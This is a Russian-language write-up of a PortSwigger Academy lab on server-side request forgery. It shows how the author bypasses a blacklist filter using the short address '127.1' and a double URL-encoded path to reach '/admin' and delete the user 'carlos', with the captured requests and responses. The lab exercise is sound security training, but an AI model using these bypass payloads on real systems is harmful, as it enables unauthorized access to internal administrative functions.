---
title: "SSRF with blacklist-based input filter"
date: 2025-07-22
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-with-blacklist-filter#"
classes: wide
---

Эта лаба содержит уязвимость **SSRF** (Server-side request forgery).

Для ее решения нужно получить доступ к интерфейсу админа `http://localhost/admin` и удалить пользователя `carlos`.

```
https://0a71006d04dde7948159e33700d200f4.web-security-academy.net/
```

## Solution

Немного посмотрю, как работает сайт, и заодно соберу `HTTP`-запросы через `Burp Proxy`. Кред для входа нам не дали(

Нашел запрос на проверку наличия товара:

```http
POST /product/stock HTTP/2
Host: 0a71006d04dde7948159e33700d200f4.web-security-academy.net
Cookie: session=dYYyqMOn0ccjpc3CG25VsB42YI4ApEIj
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a71006d04dde7948159e33700d200f4.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a71006d04dde7948159e33700d200f4.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

В параметре `stockApi` передается адрес для запроса `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`.

Попробую передать нужный `http://localhost/admin`.

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 51

"External stock check blocked for security reasons"
```

Попробую закодировать запрос в `URL`:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 51

"External stock check blocked for security reasons"
```

Далее буду пробовать разные варианты запроса:

```
http://127.0.0.1/admin - err
http://127.0.0.1/%61%64%6d%69%6e - err
http://127.1/%61%64%6d%69%6e - err
```

Попробую разделить запроса на 2 предполагаемых фильруемых значения `localhost` и `/admin`. Начну с `localhost`:

```
http://127.0.0.1 - err
http://127.1 - OK
```

Сайт распарсил сокращенный вариант адреса. Супер, теперь попробую добавить `/admin`:

```
http://127.1/admin - err
http://127.1/%25%36%31%64%6d%69%6e - OK
```

Из оригинального запроса было видно, что можно применить `URL`-кодирование. Я закодировал `а` в `URL` и получил `%61dmin`, а затем закодировал все это еще раз.

На полученной странице видно следующее:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_SSRF_with_blacklist-based_input_filter/1.png){: height="200" .align-center}

Для удаления пользователя нужно использовать ручку `/admin/delete?username=carlos`. Попробую использовать это, закодировав путь дважды:

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%66%25%36%34%25%36%35%25%36%63%25%36%35%25%37%34%25%36%35%25%33%66%25%37%35%25%37%33%25%36%35%25%37%32%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33
```

Ответ:

```http
HTTP/2 302 Found
Location: /admin
Set-Cookie: session=i0GScmiflIc0foM1PmWdwDsY2xKSF4gm; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Пользователь успешно удален:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_SSRF_with_blacklist-based_input_filter/2.png){: height="200" .align-center}